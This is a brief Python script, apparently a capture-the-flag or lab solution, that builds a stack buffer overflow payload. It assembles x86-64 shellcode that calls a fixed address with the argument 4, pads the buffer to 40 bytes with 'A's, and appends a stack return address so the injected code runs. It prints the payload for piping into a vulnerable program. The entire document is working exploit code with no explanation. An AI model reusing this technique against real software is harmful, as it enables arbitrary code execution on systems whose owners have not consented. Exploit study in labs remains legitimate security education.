import sys

stack_addr = b'\xc0\xde\xff\xff\xff\x7f\x00\x00'

sc_part1 = b'\x48\xc7\xc7\x04\x00\x00\x00'
sc_part2 = b'\x48\xb8\xda\x11\x40\x00\x00\x00\x00\x00'
sc_part3 = b'\xff\xd0'
shellcode = sc_part1 + sc_part2 + sc_part3 

padding = b'A' * (40 - len(shellcode))

payload = shellcode + padding + stack_addr

sys.stdout.buffer.write(payload)